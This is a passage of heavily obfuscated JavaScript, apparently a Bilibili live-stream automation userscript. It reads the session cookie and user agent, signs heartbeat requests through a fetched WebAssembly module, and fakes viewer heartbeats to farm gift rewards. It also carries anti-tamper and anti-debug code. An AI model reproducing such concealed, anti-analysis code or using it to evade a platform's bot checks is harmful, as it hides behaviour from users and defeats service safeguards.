x73\x3d','\x77\x72\x39\x78\x77\x6f\x46\x76\x77\x37\x77\x3d','\x49\x55\x59\x64\x77\x34\x38\x56\x48\x4d\x4b\x73\x4c\x4d\x4f\x47\x77\x6f\x72\x43\x76\x6a\x77\x3d','\x77\x34\x6e\x44\x74\x56\x7a\x43\x69\x63\x4b\x61','\x61\x6c\x2f\x44\x73\x63\x4b\x4f\x77\x35\x51\x3d','\x4a\x6b\x59\x59\x77\x37\x55\x7a','\x50\x78\x34\x31\x4a\x30\x76\x43\x74\x6d\x55\x62\x77\x34\x44\x43\x69\x41\x3d\x3d','\x6a\x73\x6a\x69\x77\x61\x43\x6d\x69\x78\x51\x57\x2e\x63\x6f\x6d\x5a\x2e\x76\x77\x36\x48\x57\x6e\x66\x49\x79\x59\x7a\x51\x45\x3d\x3d'];(function(_0x4304bc,_0x3247db,_0x2146dc){var _0x1e6c5c=function(_0x306ecd,_0x3adcee,_0x36080a,_0x3c3305,_0xfcbe3b){_0x3adcee=_0x3adcee>>0x8,_0xfcbe3b='po';var _0x4393b6='shift',_0x2ac38e='push';if(_0x3adcee<_0x306ecd){while(--_0x306ecd){_0x3c3305=_0x4304bc[_0x4393b6]();if(_0x3adcee===_0x306ecd){_0x3adcee=_0x3c3305;_0x36080a=_0x4304bc[_0xfcbe3b+'p']();}else if(_0x3adcee&&_0x36080a['replace'](/[wCxQWZwHWnfIyYzQE=]/g,'')===_0x3adcee){_0x4304bc[_0x2ac38e](_0x3c3305);}}_0x4304bc[_0x2ac38e](_0x4304bc[_0x4393b6]());}return 0x407b5;};var _0x306ef3=function(){var _0x1f8325={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x54cb81,_0xe01e4a,_0x46e7d0,_0x7c8862){_0x7c8862=_0x7c8862||{};var _0x3d9207=_0xe01e4a+'='+_0x46e7d0;var _0x4996ff=0x0;for(var _0x4996ff=0x0,_0x5d9861=_0x54cb81['length'];_0x4996ff<_0x5d9861;_0x4996ff++){var _0xbdc91a=_0x54cb81[_0x4996ff];_0x3d9207+=';\x20'+_0xbdc91a;var _0x16db25=_0x54cb81[_0xbdc91a];_0x54cb81['push'](_0x16db25);_0x5d9861=_0x54cb81['length'];if(_0x16db25!==!![]){_0x3d9207+='='+_0x16db25;}}_0x7c8862['cookie']=_0x3d9207;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4aa61e,_0x27ef37){_0x4aa61e=_0x4aa61e||function(_0x59ab96){return _0x59ab96;};var _0x1859c8=_0x4aa61e(new RegExp('(?:^|;\x20)'+_0x27ef37['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x2bb9be=typeof _0xodR=='undefined'?'undefined':_0xodR,_0x248b99=_0x2bb9be['split'](''),_0x5ef3b2=_0x248b99['length'],_0x1b9db6=_0x5ef3b2-0xe,_0x4b09d4;while(_0x4b09d4=_0x248b99['pop']()){_0x5ef3b2&&(_0x1b9db6+=_0x4b09d4['charCodeAt']());}var _0x5b36c5=function(_0x26c978,_0x5f44ed,_0x8f717d){_0x26c978(++_0x5f44ed,_0x8f717d);};_0x1b9db6^-_0x5ef3b2===-0x524&&(_0x4b09d4=_0x1b9db6)&&_0x5b36c5(_0x1e6c5c,_0x3247db,_0x2146dc);return _0x4b09d4>>0x2===0x14b&&_0x1859c8?decodeURIComponent(_0x1859c8[0x1]):undefined;}};var _0x37efc4=function(){var _0x4e132d=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x4e132d['test'](_0x1f8325['removeCookie']['toString']());};_0x1f8325['updateCookie']=_0x37efc4;var _0x3790f0='';var _0x2c0408=_0x1f8325['updateCookie']();if(!_0x2c0408){_0x1f8325['setCookie'](['*'],'counter',0x1);}else if(_0x2c0408){_0x3790f0=_0x1f8325['getCookie'](null,'counter');}else{_0x1f8325['removeCookie']();}};_0x306ef3();}(_0xd254,0x156,0x15600));var _0x1177=function(_0x79bf5e,_0x474800){_0x79bf5e=~~'0x'['concat'](_0x79bf5e);var _0x36612e=_0xd254[_0x79bf5e];if(_0x1177['EnBUuV']===undefined){(function(){var _0x57ee1e=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x509601='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x57ee1e['atob']||(_0x57ee1e['atob']=function(_0x1bd58f){var _0x5ea4ec=String(_0x1bd58f)['replace'](/=+$/,'');for(var _0x1ce846=0x0,_0x278278,_0x1582fe,_0x3ffb07=0x0,_0x5d89dc='';_0x1582fe=_0x5ea4ec['charAt'](_0x3ffb07++);~_0x1582fe&&(_0x278278=_0x1ce846%0x4?_0x278278*0x40+_0x1582fe:_0x1582fe,_0x1ce846++%0x4)?_0x5d89dc+=String['fromCharCode'](0xff&_0x278278>>(-0x2*_0x1ce846&0x6)):0x0){_0x1582fe=_0x509601['indexOf'](_0x1582fe);}return _0x5d89dc;});}());var _0x5d1a20=function(_0x13db87,_0x474800){var _0x7af64d=[],_0x5c33a3=0x0,_0x5ca582,_0x2ffec2='',_0x56c60b='';_0x13db87=atob(_0x13db87);for(var _0x4860cf=0x0,_0x5a2d4b=_0x13db87['length'];_0x4860cf<_0x5a2d4b;_0x4860cf++){_0x56c60b+='%'+('00'+_0x13db87['charCodeAt'](_0x4860cf)['toString'](0x10))['slice'](-0x2);}_0x13db87=decodeURIComponent(_0x56c60b);for(var _0x22a7fe=0x0;_0x22a7fe<0x100;_0x22a7fe++){_0x7af64d[_0x22a7fe]=_0x22a7fe;}for(_0x22a7fe=0x0;_0x22a7fe<0x100;_0x22a7fe++){_0x5c33a3=(_0x5c33a3+_0x7af64d[_0x22a7fe]+_0x474800['charCodeAt'](_0x22a7fe%_0x474800['length']))%0x100;_0x5ca582=_0x7af64d[_0x22a7fe];_0x7af64d[_0x22a7fe]=_0x7af64d[_0x5c33a3];_0x7af64d[_0x5c33a3]=_0x5ca582;}_0x22a7fe=0x0;_0x5c33a3=0x0;for(var _0x249872=0x0;_0x249872<_0x13db87['length'];_0x249872++){_0x22a7fe=(_0x22a7fe+0x1)%0x100;_0x5c33a3=(_0x5c33a3+_0x7af64d[_0x22a7fe])%0x100;_0x5ca582=_0x7af64d[_0x22a7fe];_0x7af64d[_0x22a7fe]=_0x7af64d[_0x5c33a3];_0x7af64d[_0x5c33a3]=_0x5ca582;_0x2ffec2+=String['fromCharCode'](_0x13db87['charCodeAt'](_0x249872)^_0x7af64d[(_0x7af64d[_0x22a7fe]+_0x7af64d[_0x5c33a3])%0x100]);}return _0x2ffec2;};_0x1177['zBHySf']=_0x5d1a20;_0x1177['aBddwN']={};_0x1177['EnBUuV']=!![];}var _0x55a096=_0x1177['aBddwN'][_0x79bf5e];if(_0x55a096===undefined){if(_0x1177['OKyxkA']===undefined){var _0x2e9184=function(_0x222e50){this['DGjwdy']=_0x222e50;this['cAwfGT']=[0x1,0x0,0x0];this['wsASrD']=function(){return'newState';};this['KIagDC']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['inOJOq']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x2e9184['prototype']['YHrnsB']=function(){var _0x5904e4=new RegExp(this['KIagDC']+this['inOJOq']);var _0x2c2bc6=_0x5904e4['test'](this['wsASrD']['toString']())?--this['cAwfGT'][0x1]:--this['cAwfGT'][0x0];return this['QGpWMY'](_0x2c2bc6);};_0x2e9184['prototype']['QGpWMY']=function(_0x3ba724){if(!Boolean(~_0x3ba724)){return _0x3ba724;}return this['ArWTpP'](this['DGjwdy']);};_0x2e9184['prototype']['ArWTpP']=function(_0x3c516b){for(var _0x155cc5=0x0,_0x227c17=this['cAwfGT']['length'];_0x155cc5<_0x227c17;_0x155cc5++){this['cAwfGT']['push'](Math['round'](Math['random']()));_0x227c17=this['cAwfGT']['length'];}return _0x3c516b(this['cAwfGT'][0x0]);};new _0x2e9184(_0x1177)['YHrnsB']();_0x1177['OKyxkA']=!![];}_0x36612e=_0x1177['zBHySf'](_0x36612e,_0x474800);_0x1177['aBddwN'][_0x79bf5e]=_0x36612e;}else{_0x36612e=_0x55a096;}return _0x36612e;};var _0x3dc4db=function(){var _0x4701cc=!![];return function(_0x4534d3,_0xa1f6a1){var _0x541de5=_0x4701cc?function(){if(_0xa1f6a1){var _0x3e7a15=_0xa1f6a1['apply'](_0x4534d3,arguments);_0xa1f6a1=null;return _0x3e7a15;}}:function(){};_0x4701cc=![];return _0x541de5;};}();var _0x477505=_0x3dc4db(this,function(){var _0x1e0391=function(){return'\x64\x65\x76';},_0x3f4821=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x9bfde=function(){var _0x28f15c=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x28f15c['\x74\x65\x73\x74'](_0x1e0391['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x78ff0b=function(){var _0xa8756c=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0xa8756c['\x74\x65\x73\x74'](_0x3f4821['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x857b3d=function(_0xb6f67b){var _0x1fd24f=~-0x1>>0x1+0xff%0x0;if(_0xb6f67b['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x1fd24f)){_0x18ed67(_0xb6f67b);}};var _0x18ed67=function(_0x2b09cf){var _0x342388=~-0x4>>0x1+0xff%0x0;if(_0x2b09cf['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x342388){_0x857b3d(_0x2b09cf);}};if(!_0x9bfde()){if(!_0x78ff0b()){_0x857b3d('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x857b3d('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x857b3d('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x477505();const UUID=()=>'\x78\x78\x78\x78\x78\x78\x78\x78\x2d\x78\x78\x78\x78\x2d\x34\x78\x78\x78\x2d\x79\x78\x78\x78\x2d\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78'[_0x1177('0','\x39\x73\x62\x49')](/[xy]/g,function(_0x43abce){var _0x12862e={'\x73\x76\x64\x4f\x6c':function(_0x5412d1,_0x406abc){return _0x5412d1|_0x406abc;},'\x58\x56\x4c\x41\x77':function(_0xf25f1e,_0x14737a){return _0xf25f1e*_0x14737a;},'\x55\x62\x55\x7a\x53':function(_0x289576,_0x506646){return _0x289576===_0x506646;},'\x68\x54\x7a\x6d\x4e':function(_0x1af21c,_0x423de5){return _0x1af21c&_0x423de5;}};var _0x5432e5=_0x12862e[_0x1177('1','\x21\x39\x34\x34')](_0x12862e[_0x1177('2','\x4f\x52\x31\x39')](0x10,Math[_0x1177('3','\x7a\x78\x43\x67')]()),0x0);return(_0x12862e[_0x1177('4','\x61\x41\x34\x67')]('\x78',_0x43abce)?_0x5432e5:_0x12862e[_0x1177('5','\x6d\x40\x73\x4d')](_0x12862e['\x68\x54\x7a\x6d\x4e'](0x3,_0x5432e5),0x8))[_0x1177('6','\x4e\x46\x4e\x4c')](0x10);});class HeartGiftRoom{constructor(_0xfaf12a,_0x3b926b){var _0x97efbc={'\x6a\x78\x58\x4c\x52':'\x31\x7c\x33\x7c\x31\x31\x7c\x36\x7c\x32\x7c\x37\x7c\x31\x32\x7c\x39\x7c\x35\x7c\x38\x7c\x31\x30\x7c\x30\x7c\x34','\x43\x66\x4c\x52\x6e':function(_0x244e04){return _0x244e04();},'\x63\x66\x65\x64\x4b':function(_0x4f05b9,_0x4d4833){return _0x4f05b9(_0x4d4833);},'\x4f\x74\x58\x4f\x41':'\x4c\x49\x56\x45\x5f\x42\x55\x56\x49\x44'};var _0x2d261a=_0x97efbc['\x6a\x78\x58\x4c\x52']['\x73\x70\x6c\x69\x74']('\x7c'),_0x7e9e34=0x0;while(!![]){switch(_0x2d261a[_0x7e9e34++]){case'\x30':this[_0x1177('7','\x6b\x65\x74\x58')]();continue;case'\x31':this['\x6d\x65\x64\x61\x6c']=_0x3b926b;continue;case'\x32':;continue;case'\x33':this[_0x1177('8','\x4e\x46\x4e\x4c')]=_0xfaf12a;continue;case'\x34':this['\x65\x72\x72\x6f\x72']=0x0;continue;case'\x35':this[_0x1177('9','\x25\x50\x38\x57')]=_0x97efbc['\x43\x66\x4c\x52\x6e'](UUID);continue;case'\x36':this['\x61\x72\x65\x61\x5f\x69\x64']=_0xfaf12a[_0x1177('a','\x46\x33\x42\x34')];continue;case'\x37':this[_0x1177('b','\x47\x66\x33\x5a')]=0x0;continue;case'\x38':this['\x75\x61']=window&&window['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']?window[_0x1177('c','\x5e\x63\x58\x64')]['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']:'';continue;case'\x39':this[_0x1177('d','\x39\x73\x62\x49')]=_0x97efbc[_0x1177('e','\x65\x31\x33\x53')](getCookie,_0x97efbc['\x4f\x74\x58\x4f\x41']);continue;case'\x31\x30':this[_0x1177('f','\x55\x41\x42\x65')]=new Date();continue;case'\x31\x31':this[_0x1177('10','\x5e\x63\x58\x64')]=_0xfaf12a[_0x1177('11','\x55\x66\x61\x77')];continue;case'\x31\x32':this['\x72\x6f\x6f\x6d\x5f\x69\x64']=_0xfaf12a[_0x1177('12','\x39\x73\x62\x49')];continue;}break;}}async[_0x1177('13','\x56\x68\x39\x45')](){var _0x4588e9={'\x51\x4e\x61\x57\x4f':function(_0x51a81d,_0xe30e35){return _0x51a81d>_0xe30e35;},'\x7a\x78\x46\x74\x63':function(_0x2032a3,_0xe8297f){return _0x2032a3==_0xe8297f;},'\x76\x6a\x59\x6f\x74':_0x1177('14','\x5d\x2a\x57\x78'),'\x62\x47\x70\x75\x54':function(_0x3de619,_0x236e24,_0x4eea09){return _0x3de619(_0x236e24,_0x4eea09);},'\x44\x57\x4f\x65\x62':function(_0x4377d6,_0x463f9a){return _0x4377d6*_0x463f9a;}};try{if(!HeartGift[_0x1177('15','\x4a\x51\x42\x79')]||_0x4588e9[_0x1177('16','\x7a\x78\x43\x67')](this[_0x1177('17','\x4e\x46\x4e\x4c')],0x3))return;let _0x4cda93={'\x69\x64':[this['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64'],this[_0x1177('18','\x55\x66\x61\x77')],this['\x73\x65\x71'],this[_0x1177('19','\x25\x50\x38\x57')]],'\x64\x65\x76\x69\x63\x65':[this[_0x1177('1a','\x28\x2a\x47\x21')],this[_0x1177('1b','\x34\x56\x33\x36')]],'\x74\x73':new Date()[_0x1177('1c','\x47\x66\x33\x5a')](),'\x69\x73\x5f\x70\x61\x74\x63\x68':0x0,'\x68\x65\x61\x72\x74\x5f\x62\x65\x61\x74':[],'\x75\x61':this['\x75\x61']};KeySign[_0x1177('1d','\x47\x66\x33\x5a')](_0x4cda93);let _0x16cdbe=await BiliPushUtils[_0x1177('1e','\x4d\x6e\x4e\x75')][_0x1177('1f','\x4b\x31\x40\x29')]['\x65\x6e\x74\x65\x72'](_0x4cda93);if(_0x4588e9[_0x1177('20','\x4a\x51\x42\x79')](_0x16cdbe['\x63\x6f\x64\x65'],0x0)){var _0x1af240=_0x4588e9[_0x1177('21','\x26\x76\x69\x68')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x5d8d93=0x0;while(!![]){switch(_0x1af240[_0x5d8d93++]){case'\x30':this[_0x1177('22','\x46\x33\x42\x34')]=_0x16cdbe['\x64\x61\x74\x61'][_0x1177('23','\x71\x40\x40\x78')];continue;case'\x31':this[_0x1177('24','\x5e\x63\x58\x64')]=_0x16cdbe[_0x1177('25','\x68\x4e\x75\x4c')][_0x1177('26','\x5e\x63\x58\x64')];continue;case'\x32':++this['\x73\x65\x71'];continue;case'\x33':this[_0x1177('27','\x25\x50\x38\x57')]=_0x16cdbe[_0x1177('28','\x61\x41\x34\x67')][_0x1177('29','\x62\x7a\x75\x73')];continue;case'\x34':this[_0x1177('2a','\x6d\x47\x6f\x39')]=_0x16cdbe[_0x1177('2b','\x4b\x31\x40\x29')][_0x1177('2c','\x4a\x51\x42\x79')];continue;}break;}}await _0x4588e9[_0x1177('2d','\x55\x41\x42\x65')](delayCall,()=>this[_0x1177('2e','\x65\x6f\x44\x5e')](),_0x4588e9[_0x1177('2f','\x25\x41\x77\x77')](this[_0x1177('30','\x4b\x64\x4b\x75')],0x3e8));}catch(_0x170746){this[_0x1177('31','\x6d\x37\x64\x47')]++;console['\x65\x72\x72\x6f\x72'](_0x170746);await _0x4588e9[_0x1177('32','\x6d\x37\x64\x47')](delayCall,()=>this[_0x1177('33','\x4e\x46\x4e\x4c')](),0x3e8);}}async[_0x1177('34','\x59\x2a\x56\x51')](){var _0x55bdaf={'\x61\x65\x75\x45\x74':function(_0x37e54b,_0x130a58){return _0x37e54b>_0x130a58;},'\x4f\x48\x71\x72\x64':function(_0x2f06f3,_0x9b061f){return _0x2f06f3==_0x9b061f;},'\x79\x75\x57\x74\x5a':function(_0x1483a6,_0x48ed70){return _0x1483a6<=_0x48ed70;},'\x47\x79\x5a\x73\x46':function(_0x19a782,_0x1ba2e0,_0x3456a9){return _0x19a782(_0x1ba2e0,_0x3456a9);},'\x52\x74\x46\x51\x5a':function(_0x471607,_0x9d5f13){return _0x471607*_0x9d5f13;},'\x61\x64\x6b\x5a\x52':function(_0x5199fb,_0x165bf5){return _0x5199fb!==_0x165bf5;},'\x69\x79\x6a\x7a\x52':'\x44\x67\x55\x4c\x4a','\x71\x75\x44\x69\x55':_0x1177('35','\x78\x4c\x5a\x24'),'\x47\x66\x58\x44\x57':function(_0x543bf9,_0x1019a5){return _0x543bf9(_0x1019a5);}};try{if(!HeartGift['\x70\x72\x6f\x63\x65\x73\x73']||_0x55bdaf[_0x1177('36','\x4c\x54\x71\x65')](this[_0x1177('37','\x34\x56\x33\x36')],0x3))return;let _0x5ac4ca={'\x69\x64':[this[_0x1177('38','\x55\x41\x42\x65')],this[_0x1177('39','\x4d\x6e\x4e\x75')],this[_0x1177('3a','\x68\x4e\x75\x4c')],this[_0x1177('3b','\x46\x55\x45\x4b')]],'\x64\x65\x76\x69\x63\x65':[this[_0x1177('3c','\x61\x6c\x75\x31')],this[_0x1177('3d','\x6d\x37\x64\x47')]],'\x65\x74\x73':this[_0x1177('3e','\x5e\x63\x58\x64')],'\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b':this['\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b'],'\x74\x69\x6d\x65':this[_0x1177('3f','\x7a\x78\x43\x67')],'\x74\x73':new Date()[_0x1177('40','\x65\x6f\x44\x5e')](),'\x75\x61':this['\x75\x61']};KeySign['\x63\x6f\x6e\x76\x65\x72\x74'](_0x5ac4ca);let _0x1f5342=BiliPushUtils[_0x1177('41','\x55\x41\x42\x65')](JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](_0x5ac4ca),this[_0x1177('42','\x5e\x63\x58\x64')]);if(_0x1f5342){_0x5ac4ca['\x73']=_0x1f5342;let _0x5c2a91=await BiliPushUtils[_0x1177('43','\x5e\x63\x58\x64')][_0x1177('44','\x51\x30\x49\x6c')][_0x1177('45','\x4e\x46\x4e\x4c')](_0x5ac4ca);if(_0x55bdaf['\x4f\x48\x71\x72\x64'](_0x5c2a91['\x63\x6f\x64\x65'],0x0)){console[_0x1177('46','\x70\x70\x26\x5a')](_0x1177('47','\x56\x68\x39\x45')+this[_0x1177('48','\x65\x6f\x44\x5e')][_0x1177('49','\x25\x50\x38\x57')]+'\x5d\u623f\u95f4\x5b'+this[_0x1177('4a','\x4d\x6e\x4e\x75')]+_0x1177('4b','\x55\x41\x42\x65'));++HeartGift[_0x1177('4c','\x5d\x2a\x57\x78')];++this[_0x1177('4d','\x4e\x46\x4e\x4c')];this[_0x1177('4e','\x76\x21\x42\x4f')]=_0x5c2a91[_0x1177('4f','\x39\x73\x62\x49')][_0x1177('50','\x6b\x65\x74\x58')];this[_0x1177('51','\x46\x55\x45\x4b')]=_0x5c2a91[_0x1177('52','\x56\x68\x39\x45')][_0x1177('53','\x6d\x40\x73\x4d')];this[_0x1177('54','\x25\x41\x77\x77')]=_0x5c2a91['\x64\x61\x74\x61']['\x74\x69\x6d\x65\x73\x74\x61\x6d\x70'];this[_0x1177('55','\x4b\x31\x40\x29')]=_0x5c2a91[_0x1177('56','\x46\x55\x45\x4b')][_0x1177('57','\x6c\x35\x4a\x78')];if(_0x55bdaf[_0x1177('58','\x4e\x46\x4e\x4c')](HeartGift[_0x1177('59','\x6c\x35\x4a\x78')],HeartGift[_0x1177('5a','\x59\x73\x34\x54')])&&HeartGift[_0x1177('15','\x4a\x51\x42\x79')]){await _0x55bdaf[_0x1177('5b','\x6d\x37\x64\x47')](delayCall,()=>this[_0x1177('5c','\x4a\x51\x42\x79')](),_0x55bdaf['\x52\x74\x46\x51\x5a'](this[_0x1177('5d','\x34\x56\x33\x36')],0x3e8));}else{if(_0x55bdaf['\x61\x64\x6b\x5a\x52'](_0x55bdaf['\x69\x79\x6a\x7a\x52'],_0x55bdaf[_0x1177('5e','\x51\x30\x49\x6c')])){if(HeartGift[_0x1177('5f','\x34\x56\x33\x36')]){console['\x6c\x6f\x67'](_0x1177('60','\x6f\x23\x6e\x38'));HeartGift[_0x1177('61','\x56\x68\x39\x45')]=![];_0x55bdaf[_0x1177('62','\x28\x2a\x47\x21')](runTomorrow,HeartGift[_0x1177('63','\x65\x31\x33\x53')]);}}else{delete Module[_0x1177('64','\x25\x50\x38\x57')][_0x1177('65','\x71\x40\x40\x78')][id];}}}}}catch(_0x36f047){this[_0x1177('66','\x26\x76\x69\x68')]++;console[_0x1177('67','\x4a\x51\x42\x79')](_0x36f047);await _0x55bdaf[_0x1177('68','\x68\x4e\x75\x4c')](delayCall,()=>this['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](),0x3e8);}}}const HeartGift={'\x74\x6f\x74\x61\x6c':0x0,'\x6d\x61\x78':0x19,'\x70\x72\x6f\x63\x65\x73\x73':!![],'\x72\x75\x6e':async()=>{var _0x10142d={'\x4a\x53\x44\x6c\x4d':function(_0x289cde,_0x528fcc){return _0x289cde!==_0x528fcc;},'\x77\x4d\x75\x71\x43':_0x1177('69','\x6d\x47\x6f\x39'),'\x52\x54\x79\x71\x6b':_0x1177('6a','\x51\x30\x49\x6c'),'\x5a\x68\x51\x59\x63':_0x1177('6b','\x56\x68\x39\x45'),'\x46\x6f\x42\x56\x4e':function(_0x1683e8,_0x114ab5){return _0x1683e8==_0x114ab5;},'\x55\x54\x7a\x51\x53':_0x1177('6c','\x65\x31\x33\x53'),'\x76\x49\x6b\x61\x74':_0x1177('6d','\x30\x6a\x77\x72'),'\x63\x54\x46\x73\x5a':function(_0x2a6577,_0x430ee3){return _0x2a6577>_0x430ee3;},'\x42\x44\x4d\x62\x41':function(_0x3898ad,_0x178951){return _0x3898ad===_0x178951;},'\x4d\x54\x70\x77\x79':_0x1177('6e','\x34\x32\x4e\x63'),'\x58\x6d\x70\x4b\x65':'\x49\x5a\x52\x57\x75','\x45\x74\x6f\x7a\x41':_0x1177('6f','\x56\x68\x39\x45'),'\x61\x49\x6a\x68\x6e':function(_0x59fe14,_0x5830e6,_0x3b3c4b){return _0x59fe14(_0x5830e6,_0x3b3c4b);}};if(!HeartGift[_0x1177('70','\x6d\x37\x64\x47')]){HeartGift[_0x1177('71','\x4a\x51\x42\x79')]=0x0;HeartGift[_0x1177('72','\x5d\x2a\x57\x78')]=!![];}if(_0x10142d[_0x1177('73','\x76\x46\x52\x6c')](BiliPushUtils[_0x1177('74','\x26\x76\x69\x68')],null)){let _0x267e5d=await HeartGift[_0x1177('75','\x71\x40\x40\x78')](_0x10142d[_0x1177('76','\x61\x41\x34\x67')],HeartGift[_0x1177('77','\x56\x68\x39\x45')]);if(_0x267e5d){BiliPushUtils['\x73\x69\x67\x6e']=function(_0x642bea,_0x4f1438){if(_0x10142d['\x4a\x53\x44\x6c\x4d'](_0x10142d[_0x1177('78','\x34\x56\x33\x36')],_0x10142d[_0x1177('79','\x76\x46\x52\x6c')])){_0x642bea=Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x1177('7a','\x71\x40\x40\x78')](_0x642bea),Module[_0x1177('7b','\x76\x21\x42\x4f')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x4f1438,function(){try{return{'\x76\x61\x6c\x75\x65':_0x642bea[_0x1177('7c','\x4c\x54\x71\x65')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x1a2203){return{'\x65\x72\x72\x6f\x72':_0x1a2203,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());}else{if(CONFIG[_0x1177('7d','\x4c\x54\x71\x65')]&&BiliPush['\x63\x6f\x6e\x6e\x65\x63\x74\x65\x64']){if(_0x10142d['\x4a\x53\x44\x6c\x4d'](_0x10142d[_0x1177('7e','\x78\x4c\x5a\x24')],_0x10142d[_0x1177('7f','\x73\x73\x5a\x6b')])){return _0x267e5d[_0x1177('80','\x34\x32\x4e\x63')](_0x642bea,_0x4f1438);}else{_0x642bea=Module[_0x1177('81','\x34\x56\x33\x36')][_0x1177('7a','\x71\x40\x40\x78')](_0x642bea),Module[_0x1177('82','\x68\x4e\x75\x4c')][_0x1177('83','\x75\x70\x24\x40')](_0x4f1438,function(){try{return{'\x76\x61\x6c\x75\x65':_0x642bea[_0x1177('84','\x46\x71\x51\x48')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x239935){return{'\x65\x72\x72\x6f\x72':_0x239935,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());}}}};}else{console[_0x1177('85','\x55\x41\x42\x65')](_0x10142d[_0x1177('86','\x61\x6c\x75\x31')]);return;}}let _0x5c3d0b=await Gift[_0x1177('87','\x47\x66\x33\x5a')]();if(_0x5c3d0b&&_0x10142d[_0x1177('88','\x5e\x63\x58\x64')](_0x5c3d0b[_0x1177('89','\x25\x41\x77\x77')],0x0)){if(_0x10142d[_0x1177('8a','\x25\x48\x23\x70')](_0x10142d[_0x1177('8b','\x76\x46\x52\x6c')],_0x10142d[_0x1177('8c','\x4e\x46\x4e\x4c')])){return undefined;}else{console[_0x1177('8d','\x78\x4c\x5a\x24')](_0x10142d[_0x1177('8e','\x4d\x6e\x4e\x75')]);for(let _0x1c034e of _0x5c3d0b){let _0x118ced=await API[_0x1177('8f','\x65\x53\x71\x4b')][_0x1177('90','\x76\x21\x42\x4f')](_0x10142d['\x61\x49\x6a\x68\x6e'](parseInt,_0x1c034e[_0x1177('91','\x21\x39\x34\x34')],0xa));if(_0x10142d[_0x1177('92','\x26\x76\x69\x68')](_0x118ced[_0x1177('93','\x73\x73\x5a\x6b')],0x0)){console[_0x1177('94','\x4d\x6e\x4e\x75')](_0x1177('95','\x70\x70\x26\x5a')+_0x1c034e['\x6d\x65\x64\x61\x6c\x4e\x61\x6d\x65']+_0x1177('96','\x6d\x47\x6f\x39')+_0x118ced[_0x1177('97','\x71\x40\x40\x78')][_0x1177('3b','\x46\x55\x45\x4b')]+_0x1177('98','\x4a\x51\x42\x79'));new HeartGiftRoom(_0x118ced['\x64\x61\x74\x61'],_0x1c034e);await _0x10142d[_0x1177('99','\x55\x66\x61\x77')](delayCall,()=>{},0x3e8);}}}}},'\x62\x69\x6e\x64\x57\x61\x73\x6d':function(_0x91973f,_0x8448e2){var _0x3c4cda={'\x77\x4f\x55\x49\x6d':_0x1177('9a','\x68\x4e\x75\x4c'),'\x79\x72\x59\x5a\x49':function(_0x211a80,_0x3566e1){return _0x211a80!==_0x3566e1;},'\x4c\x70\x71\x72\x62':'\x52\x75\x54\x50\x57','\x6f\x6a\x4b\x6d\x77':function(_0x1a98bf,_0x3ed243){return _0x1a98bf!==_0x3ed243;},'\x54\x76\x59\x78\x50':_0x1177('9b','\x65\x53\x71\x4b'),'\x4e\x49\x44\x62\x77':_0x1177('9c','\x28\x2a\x47\x21'),'\x4f\x73\x4c\x56\x44':function(_0x348477){return _0x348477();},'\x73\x47\x49\x48\x58':function(_0x1580a4,_0x4c4e12,_0x30c9be){return _0x1580a4(_0x4c4e12,_0x30c9be);},'\x67\x4e\x73\x53\x4e':_0x1177('9d','\x46\x55\x45\x4b'),'\x73\x70\x45\x4f\x4e':function(_0x3a8b92,_0x10229f){return _0x3a8b92==_0x10229f;},'\x55\x79\x4b\x65\x7a':_0x1177('9e','\x39\x73\x62\x49')};var _0xaad5b7=_0x3c4cda[_0x1177('9f','\x34\x56\x33\x36')](_0x8448e2),_0x8e7622=_0x3c4cda[_0x1177('a0','\x21\x39\x34\x34')](fetch,_0x91973f,{'\x63\x72\x65\x64\x65\x6e\x74\x69\x61\x6c\x73':_0x3c4cda[_0x1177('a1','\x4b\x64\x4b\x75')]});return(_0x3c4cda[_0x1177('a2','\x65\x31\x33\x53')](_0x3c4cda['\x55\x79\x4b\x65\x7a'],typeof 